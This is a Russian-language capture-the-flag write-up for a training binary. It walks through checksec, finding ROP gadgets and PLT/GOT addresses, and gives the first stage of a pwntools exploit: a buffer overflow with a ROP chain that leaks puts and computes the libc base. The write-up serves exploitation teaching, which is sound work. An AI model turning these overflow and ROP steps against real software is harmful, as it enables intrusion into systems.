# WRITEUP.md

### Description

Простая таска на использование техники с `ROP` гаджетам цепачками.

### Solition


#### Step 1 - Проверка средств безопасности - checksec

Смотрим какие средства безопасности были использованы при комплияции бинаря, для этого используется утилита `checksec`:

![](img/img1.png)

```bash
$ checksec --file=main
[*] '/home/luksa/git/BugHunters_Lab/pwn-sprush/tasks/03-static-rop/app/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

#### Step 2 - Получаем адрес POP RDI RET

Узнаем адрес `pop rdi; ret`, есть 2 варианта:
- использовать утилиту `ROPgadget`;
- использовать `gdbpwn`;

Первый вариант, используем `ROPgadget`:

![](img/img2.png)
![](img/img3.png)

```bash
$ ROPgadget --binary ./main

Gadgets information
============================================================
0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x00000000004010bb : add bh, bh ; loopne 0x401125 ; nop ; ret
0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020
< ... SKIP ... >

0x00000000004010b6 : or dword ptr [rdi + 0x404028], edi ; jmp rax
0x000000000040112d : pop rbp ; ret
0x000000000040114a : pop rdi ; ret

< ... SKIP ... >

Unique gadgets found: 64
```

Второй вариант, используем `gdbpwn`:

![](img/img4.png)

```c
└─$ gdb-pwndbg main
Reading symbols from main...
(No debugging symbols found in main)
pwndbg> 
pwndbg> x/32i ROP
   0x401146 <ROP>:	push   rbp
   0x401147 <ROP+1>:	mov    rbp,rsp
   0x40114a <ROP+4>:	pop    rdi
   0x40114b <ROP+5>:	ret
   0x40114c <ROP+6>:	nop
   0x40114d <ROP+7>:	pop    rbp
   0x40114e <ROP+8>:	ret
   0x40114f <func>:     push   rbp
   0x401150 <func+1>:	mov    rbp,rsp
   0x401153 <func+4>:	sub    rsp,0x20
   0x401157 <func+8>:	lea    rax,[rbp-0x20]
   0x40115b <func+12>:	mov    edx,0x100
   0x401160 <func+17>:	mov    rsi,rax
   0x401163 <func+20>:	mov    edi,0x0
   0x401168 <func+25>:	call   0x401040 <read@plt>

```

Получем адрес `pop_rdi = 0x40114a`


#### Step 3 - Получем адреса puts@plt / puts@got.plt

Требуется получить адреса puts@plt и puts@got.plt, для этого:
 1. выполняем `info functions`
 2. извлекаем адрес обертки `puts@plt`
 3. извлекаем адрес `puts@got.plt` где должен лежать `libc.so`

![](img/img5.png)

```c
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  read@plt
0x0000000000401050  setvbuf@plt
0x0000000000401060  _start
0x0000000000401090  _dl_relocate_static_pie
0x00000000004010a0  deregister_tm_clones
0x00000000004010d0  register_tm_clones
0x0000000000401110  __do_global_dtors_aux
0x0000000000401140  frame_dummy
0x0000000000401146  ROP
0x000000000040114f  func
0x0000000000401170  main
0x00000000004011d0  _fini

pwndbg> x/8i 0x0000000000401030
   0x401030 <puts@plt>:	        jmp    QWORD PTR [rip+0x2fca]   # 0x404000 <puts@got.plt>
   0x401036 <puts@plt+6>:	    push   0x0
   0x40103b <puts@plt+11>:	    jmp    0x401020
   0x401040 <read@plt>:	        jmp    QWORD PTR [rip+0x2fc2]   # 0x404008 <read@got.plt>
   0x401046 <read@plt+6>:	    push   0x1
   0x40104b <read@plt+11>:	    jmp    0x401020
   0x401050 <setvbuf@plt>:	    jmp    QWORD PTR [rip+0x2fba]   # 0x404010 <setvbuf@got.plt>
   0x401056 <setvbuf@plt+6>:    push   0x2

```

Получаем адреса:
 - puts@plt = 0x401030
 - puts@got.plt = 0x404000

#### Step 4 - первая честь эксплойта

В вашем коде используется 64-битный `calling convention`, где первый аргумент передаётся через регистр `RDI`. Цепочка `ROP` должна:

 1. Положить адрес (в данном случае адрес GOT записи для `puts`) в `RDI`
 2. Вызвать `puts@plt` (который выведет значение по этому адресу)
 3. Вернуться в `main` для второго этапа эксплойта

Пишем первую часть эксплойта, указываем адреса `ROP` гаджета и функции `puts`:

```python
from pwn import *

# адреса pop_rdi и puts@, берутся из info function для первого BOF
pop_rdi = 0x40114a
puts_got = 0x404000
puts_plt = 0x401030

```

Добавляем запуск приложения, создаем `ROP`-цепочку, затем выводим реальный адрес `puts` в hex формате.

```python
p = process('../app/main')
#pause()
p.recvline()
p.sendline(b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt))

#puts_addr = p.recv(6)
puts_addr = int(p.recvline()[:-1][::-1].hex(), 16)
```

Зная адрес функции puts в `libc.so`, можем узнать базовый адрес `libc.so`, но предварительно нужно узнать сдвиг (offset) используя gdbpwn:

![](img/img6.png)

```c
$ pwndbg app/main

pwndbg> start

< ... SKIP ... >

pwndbg> xinfo puts
Extended information for virtual address 0x7ffff7e2f760:

  Containing mapping:
    0x7ffff7dd8000     0x7ffff7f3d000 r-xp   165000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6

  Offset information:
         Mapped Area 0x7ffff7e2f760 = 0x7ffff7dd8000 + 0x57760
         File (Base) 0x7ffff7e2f760 = 0x7ffff7db0000 + 0x7f760
      File (Segment) 0x7ffff7e2f760 = 0x7ffff7dd8000 + 0x57760
         File (Disk) 0x7ffff7e2f760 = /usr/lib/x86_64-linux-gnu/libc.so.6 + 0x7f760

 Containing ELF sections:
               .text 0x7ffff7e2f760 = 0x7ffff7dd8400 + 0x57360
pwndbg>
```

Наш сдвиг равен = `0x7f760`, дописываем первую часть:

```
# из puts вычитаем сдвиг до начального адреса libc
libc_addr = puts_addr - 0x7f760
```